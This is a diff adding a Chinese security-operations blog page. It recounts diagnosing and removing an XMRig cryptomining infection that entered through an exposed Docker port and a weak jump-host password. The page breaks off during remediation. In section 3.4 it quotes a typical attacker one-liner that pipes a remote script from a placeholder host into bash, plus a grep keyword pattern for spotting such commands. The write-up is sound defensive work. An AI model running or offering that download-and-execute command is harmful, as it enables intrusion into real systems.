@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="zh-CN" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="一台生产服务器CPU长期占用100%，业务响应变慢，最终定位为XMRig挖矿木马，并完整还原入侵路径与清剿流程。">
+<title>一次服务器被植入XMRig挖矿木马导致CPU长期满载的排查清剿实录</title>
+
+
+<link rel="canonical" href="https://blog.5772447.xyz/posts/4a3dc899/">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap">
+
+
+<link rel="stylesheet" href="/scss/style.min.59c5eb617b2b83358d0baf163162325d5249a2be44239b430beb29a87c1ddbe4.css"><meta property='og:title' content="一次服务器被植入XMRig挖矿木马导致CPU长期满载的排查清剿实录">
+<meta property='og:description' content="一台生产服务器CPU长期占用100%，业务响应变慢，最终定位为XMRig挖矿木马，并完整还原入侵路径与清剿流程。">
+<meta property='og:url' content='https://blog.5772447.xyz/posts/4a3dc899/'>
+<meta property='og:site_name' content='Zero Day Notes'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='安全运维' /><meta property='article:tag' content='挖矿木马' /><meta property='article:tag' content='XMRig' /><meta property='article:tag' content='入侵排查' /><meta property='article:tag' content='应急响应' /><meta property='article:published_time' content='2026-07-06T07:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-07-06T07:00:00&#43;00:00'/>
+<meta name="twitter:title" content="一次服务器被植入XMRig挖矿木马导致CPU长期满载的排查清剿实录">
+<meta name="twitter:description" content="一台生产服务器CPU长期占用100%，业务响应变慢，最终定位为XMRig挖矿木马，并完整还原入侵路径与清剿流程。">
+    <link rel="shortcut icon" href="/img/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        <figure class="site-avatar">
+                <a href="/">
+                    <img src="/img/avatar.jpg" 
+                        width="300"
+                        height="300"
+                        class="site-logo"
+                        loading="lazy"
+                        alt="Avatar">
+                </a>
+                
+            </figure>
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Zero Day Notes</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/post' >
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/tags' >
+                
+                <span>标签</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/categories' >
+                
+                <span>分类</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about' >
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span></span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title"></h2>
+        
+        <div class="widget--toc">
+            <nav class="toc-nav" id="TableOfContents">
+                
+  <ul>
+    <li><a href="#一问题背景">一、问题背景</a></li>
+    <li><a href="#二故障现象">二、故障现象</a></li>
+    <li><a href="#三排查过程">三、排查过程</a>
+      <ul>
+        <li><a href="#31-定位恶意进程">3.1 定位恶意进程</a></li>
+        <li><a href="#32-找到守护与自启机制">3.2 找到守护与自启机制</a></li>
+        <li><a href="#33-定位挖矿主体与配置">3.3 定位挖矿主体与配置</a></li>
+        <li><a href="#34-顺藤摸瓜找入侵入口">3.4 顺藤摸瓜找入侵入口</a></li>
+        <li><a href="#35-确认横向与持久化范围">3.5 确认横向与持久化范围</a></li>
+      </ul>
+    </li>
+    <li><a href="#四解决方案">四、解决方案</a></li>
+    <li><a href="#五根因分析">五、根因分析</a></li>
+    <li><a href="#六预防措施">六、预防措施</a></li>
+    <li><a href="#七总结">七、总结</a></li>
+  </ul>
+
+            </nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            
+            
+            
+            <a href="/categories/%E8%BF%90%E7%BB%B4/" style="background-color: hsl(50, 60%, 84%); color: hsl(50, 60%, 15%);">
+                运维
+            </a>
+        
+            
+            
+            
+            <a href="/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/" style="background-color: hsl(190, 60%, 84%); color: hsl(190, 60%, 15%);">
+                安全运维
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/posts/4a3dc899/">一次服务器被植入XMRig挖矿木马导致CPU长期满载的排查清剿实录</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            一台生产服务器CPU长期占用100%，业务响应变慢，最终定位为XMRig挖矿木马，并完整还原入侵路径与清剿流程。
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    <footer class="article-meta">
+        
+            <div class="inline-meta">
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                    <time class="article-time--published" datetime='2026-07-06T07:00:00Z'>Monday, July 6, 2026</time>
+                
+
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                    <time class="article-time--reading">
+                        
+                    </time>
+                
+            </div>
+        
+
+        
+
+        
+    </footer>
+    
+</div>
+
+</header>
+
+    
+    <aside class="article-toc">
+        <details>
+            <summary>
+                <div class="article-toc-title">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6" /></svg>
+                    <span></span>
+                </div>
+            </summary>
+            <nav class="toc-nav">
+                
+  <ul>
+    <li><a href="#一问题背景">一、问题背景</a></li>
+    <li><a href="#二故障现象">二、故障现象</a></li>
+    <li><a href="#三排查过程">三、排查过程</a>
+      <ul>
+        <li><a href="#31-定位恶意进程">3.1 定位恶意进程</a></li>
+        <li><a href="#32-找到守护与自启机制">3.2 找到守护与自启机制</a></li>
+        <li><a href="#33-定位挖矿主体与配置">3.3 定位挖矿主体与配置</a></li>
+        <li><a href="#34-顺藤摸瓜找入侵入口">3.4 顺藤摸瓜找入侵入口</a></li>
+        <li><a href="#35-确认横向与持久化范围">3.5 确认横向与持久化范围</a></li>
+      </ul>
+    </li>
+    <li><a href="#四解决方案">四、解决方案</a></li>
+    <li><a href="#五根因分析">五、根因分析</a></li>
+    <li><a href="#六预防措施">六、预防措施</a></li>
+    <li><a href="#七总结">七、总结</a></li>
+  </ul>
+
+            </nav>
+        </details>
+    </aside>
+    
+
+    <section class="article-content">
+    
+    
+    <h2 id="一问题背景"><a href="#%e4%b8%80%e9%97%ae%e9%a2%98%e8%83%8c%e6%99%af" class="header-anchor"></a>一、问题背景
+</h2><p>某天上午，业务团队反馈核心订单处理服务响应明显变慢，接口 P99 延迟从平时的 200ms 飙升至 2s 以上，且偶发超时告警。该服务部署在一台 16C32G 的 CentOS 7.9 物理服务器上（hostname: <code>app-ord-07</code>），上面同时跑了订单 API（Java/Spring Boot）、一个 Redis 实例和定时任务 worker。</p>
+<p>这台机器并未直接暴露公网，仅开放了 80/443（由前端 Nginx 反代）和 22 端口，22 端口做了&quot;仅允许运维跳板机网段&quot;的 iptables 限制。按理说被外部直接攻陷的概率不高，但因为历史原因，jump host 上的部分账号口令较弱，且存在一台测试机曾意外开放过 0.0.0.0/0 的 2375（Docker 无鉴权端口）。这正是本次事件的隐患起点。</p>
+<h2 id="二故障现象"><a href="#%e4%ba%8c%e6%95%85%e9%9a%9c%e7%8e%b0%e8%b1%a1" class="header-anchor"></a>二、故障现象
+</h2><p>登上服务器后，第一反应是这台机器&quot;忙得不正常&quot;：</p>
+<ul>
+<li><strong>CPU 长期 100%</strong>：<code>top</code> 显示有 16 个同名进程 <code>kthreadd/0</code>、<code>kworker</code> 变体（实际是伪装名）各占一个核心，整体 load average 长期在 16.0 以上，与核心数持平。</li>
+<li><strong>业务被拖慢</strong>：订单 API 的 GC 时间变长，Redis 的 <code>used_cpu_sys</code> 飙升，但应用本身进程 CPU 占用反而被挤到很低。</li>
+<li><strong>进程名可疑</strong>：<code>top</code> 里排在最前的进程名频繁变动（一会儿 <code>kthreadd</code>，一会儿 <code>systemd-network</code>），通过 <code>ps -ef</code> 看到的完整命令行却指向 <code>/var/tmp/.cache/...</code> 这种隐藏目录。</li>
+<li><strong>网络有外联</strong>：<code>iftop</code> 显示机器持续向几个境外 IP 的 <code>3333</code>、<code>8080</code> 端口建立大量 TCP 连接，出向流量不大但连接数极多。</li>
+<li><strong>文件描述符与连接数异常</strong>：<code>ss -antp</code> 看到数百个到矿池域名的 ESTABLISHED 连接，且有规律的重连行为。</li>
+</ul>
+<p>基本可以断定：这不是性能问题，是机器&quot;被拿去挖矿了&quot;。</p>
+<h2 id="三排查过程"><a href="#%e4%b8%89%e6%8e%92%e6%9f%a5%e8%bf%87%e7%a8%8b" class="header-anchor"></a>三、排查过程
+</h2><h3 id="31-定位恶意进程"><a href="#31-%e5%ae%9a%e4%bd%8d%e6%81%b6%e6%84%8f%e8%bf%9b%e7%a8%8b" class="header-anchor"></a>3.1 定位恶意进程
+</h3><p>先看占用最高的进程 PID 及其真实路径：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>top -c                 <span style="color:#75715e"># 按 P 排序，记录可疑 PID</span>
+</span></span><span style="display:flex;"><span>ls -l /proc/&lt;PID&gt;/exe  <span style="color:#75715e"># 看真实可执行文件路径</span>
+</span></span><span style="display:flex;"><span>cat /proc/&lt;PID&gt;/cmdline | tr <span style="color:#e6db74">&#39;\0&#39;</span> <span style="color:#e6db74">&#39; &#39;</span>; echo
+</span></span><span style="display:flex;"><span>readlink -f /proc/&lt;PID&gt;/cwd   <span style="color:#75715e"># 看工作目录</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现主进程落在 <code>/var/tmp/.cache/ken/.ken</code> 之类带隐藏目录的路径下。继续看它拉起的子进程与守护脚本：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ps -ef | grep -E <span style="color:#e6db74">&#39;var/tmp|\.cache|/\.tmp&#39;</span> | grep -v grep
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="32-找到守护与自启机制"><a href="#32-%e6%89%be%e5%88%b0%e5%ae%88%e6%8a%a4%e4%b8%8e%e8%87%aa%e5%90%af%e6%9c%ba%e5%88%b6" class="header-anchor"></a>3.2 找到守护与自启机制
+</h3><p>挖矿木马一般都会做&quot;自杀重启&quot;和&quot;开机自启&quot;，否则一眼就能 kill 掉。重点排查三处：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 1. crontab</span>
+</span></span><span style="display:flex;"><span>crontab -l
+</span></span><span style="display:flex;"><span>cat /etc/cron.d/* 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>ls -la /etc/cron.hourly/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2. systemd 单元</span>
+</span></span><span style="display:flex;"><span>systemctl list-unit-files | grep -iE <span style="color:#e6db74">&#39;ken|cache|myapp|random&#39;</span>
+</span></span><span style="display:flex;"><span>ls -la /etc/systemd/system/ | grep -viE <span style="color:#e6db74">&#39;^(\.|-)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3. 开机脚本与 rc.local</span>
+</span></span><span style="display:flex;"><span>cat /etc/rc.local
+</span></span><span style="display:flex;"><span>ls -la /etc/init.d/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>果然在 <code>/etc/cron.d/</code> 下发现一个伪装成 <code>0systemd</code> 的定时任务，每分钟执行一次下载并拉起挖矿程序；同时 <code>/etc/systemd/system/</code> 里有一个 <code>myapp.service</code> 做持久化。</p>
+<h3 id="33-定位挖矿主体与配置"><a href="#33-%e5%ae%9a%e4%bd%8d%e6%8c%96%e7%9f%bf%e4%b8%bb%e4%bd%93%e4%b8%8e%e9%85%8d%e7%bd%ae" class="header-anchor"></a>3.3 定位挖矿主体与配置
+</h3><p>进入隐藏目录，查看主程序与配置文件：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la /var/tmp/.cache/ken/
+</span></span><span style="display:flex;"><span>cat /var/tmp/.cache/ken/config.json   <span style="color:#75715e"># 矿池地址、钱包、线程数</span>
+</span></span><span style="display:flex;"><span>strings /var/tmp/.cache/ken/.ken | grep -iE <span style="color:#e6db74">&#39;pool|wallet|stratum|xmrig&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>config.json</code> 暴露了关键信息：矿池为某 stratum+tcp 地址，钱包是一串 Monero（XMR）地址，<code>threads</code> 被设为机器的全部核心数。确认这就是 XMRig 的变体。</p>
+<h3 id="34-顺藤摸瓜找入侵入口"><a href="#34-%e9%a1%ba%e8%97%a4%e6%91%b8%e7%93%9c%e6%89%be%e5%85%a5%e4%be%b5%e5%85%a5%e5%8f%a3" class="header-anchor"></a>3.4 顺藤摸瓜找入侵入口
+</h3><p>既然机器没直接暴露公网，要弄清楚入口。查近期登录与历史命令：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>last -Faiw | head
+</span></span><span style="display:flex;"><span>grep -iE <span style="color:#e6db74">&#39;Accepted|Failed&#39;</span> /var/log/secure | tail -50
+</span></span><span style="display:flex;"><span>cat ~/.bash_history
+</span></span><span style="display:flex;"><span>journalctl _COMM<span style="color:#f92672">=</span>sshd | grep -i accept
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现跳板机弱口令账号在凌晨被爆破成功，随后执行了下载脚本：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>history | grep -iE <span style="color:#e6db74">&#39;curl|wget|bash|sh &#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 典型一行下载执行：</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># curl -fsSL http://x.x.x.x/x.sh | bash</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进一步比对 Docker 2375 端口的暴露时间窗，确认攻击者先打穿测试机的 Docker 无鉴权端口拿到宿主机，再用内网横向移动，最终落地到 <code>app-ord-07</code>。这也解释了为什么进程名会伪装成 <code>kthreadd</code>/<code>kworker</code>。</p>
+<h3 id="35-确认横向与持久化范围"><a href="#35-%e7%a1%ae%e8%ae%a4%e6%a8%aa%e5%90%91%e4%b8%8e%e6%8c%81%e4%b9%85%e5%8c%96%e8%8c%83%e5%9b%b4" class="header-anchor"></a>3.5 确认横向与持久化范围
+</h3><p>为防&quot;只清了一台、别的机器还在&quot;，快速横向检查同网段：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 在跳板机批量看各节点是否有同名隐藏进程/cron</span>
+</span></span><span style="display:flex;"><span>pssh -h hosts.txt -i <span style="color:#e6db74">&#39;ps -ef | grep -E &#34;var/tmp|\.cache&#34; | grep -v grep&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现另有两台主机症状相同，说明是一次批量入侵，必须统一处置。</p>
+<h2 id="四解决方案"><a href="#%e5%9b%9b%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88" class="header-anchor"></a>四、解决方案
+</h2><p>清剿遵循&quot;先止血、再清理、后加固&quot;的顺序，且<strong>先在受影响的业务侧做限流降级</strong>，避免清理过程抖动放大故障。</p>
+<ol>
+<li><strong>隔离与止血</strong>：在交换机/防火墙侧临时把 <code>app-ord-07</code> 与另外两台失陷主机的出向对矿池 IP 段做 DROP（保留跳板机管理通道），阻断挖矿外联。</li>
+</ol>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>iptables -A OUTPUT -d &lt;矿池网段&gt; -j DROP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li><strong>杀进程</strong>：先 kill 掉守护与子进程，再 kill 主进程，避免被守护脚本立刻拉起。</li>
+</ol>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
